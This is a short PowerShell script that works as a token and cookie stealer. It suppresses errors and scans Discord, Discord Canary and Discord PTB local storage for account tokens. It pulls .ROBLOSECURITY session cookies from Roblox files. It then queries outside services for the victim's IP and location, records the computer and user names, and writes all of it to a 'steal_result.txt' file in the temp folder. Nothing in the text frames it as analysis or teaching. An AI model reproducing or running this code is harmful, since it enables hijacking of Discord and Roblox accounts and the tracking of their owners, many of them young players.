$ErrorActionPreference="SilentlyContinue"
$d=@()
$p=@("$env:APPDATA\Discord\Local Storage\leveldb","$env:APPDATA\DiscordCanary\Local Storage\leveldb","$env:APPDATA\DiscordPTB\Local Storage\leveldb")
foreach($q in $p){
    if(Test-Path $q){
        Get-ChildItem $q -Filter *.log,*.ldb | ForEach-Object {
            $c=Get-Content $_.FullName -Raw
            [regex]::Matches($c,'[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}') | ForEach-Object {
                if($_.Value.Length -gt 20){
                    $d+="DISCORD|0|||0|"+$_.Value
                }
            }
        }
    }
}
$r=@("$env:LOCALAPPDATA\Roblox\LocalStorage\RobloxCookies.dat","$env:LOCALAPPDATA\Roblox\LocalStorage\robloxcookies.dat")
foreach($q in $r){
    if(Test-Path $q){
        $c=Get-Content $q -Raw
        [regex]::Matches($c,'\.ROBLOSECURITY[^;''"]+') | ForEach-Object {
            if($_.Value.Length -gt 20){
                $d+="ROBLOX|"+$_.Value
            }
        }
    }
}
$net=New-Object Net.WebClient
$net.Headers.Add('User-Agent','Mozilla/5.0')
$ip=$net.DownloadString('https://api.ipify.org/')
$geo=$net.DownloadString('http://ip-api.com/line/'+$ip+'?fields=country,regionName,city,isp')
$sys='IP: '+$ip+' | '+$geo+' | PC: '+$env:COMPUTERNAME+' | User: '+$env:USERNAME
$d+='SYSTEM|'+$sys
$d|Out-File "$env:TEMP\steal_result.txt"
